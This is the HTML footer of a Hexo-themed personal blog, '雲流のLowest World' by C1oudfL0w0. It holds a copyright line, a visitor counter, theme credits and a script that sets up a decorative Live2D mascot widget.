        <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2023 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
            <span id="busuanzi_container_site_uv"> 
                本站访客数<span id="busuanzi_value_site_uv"></span>人次
            </span>
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

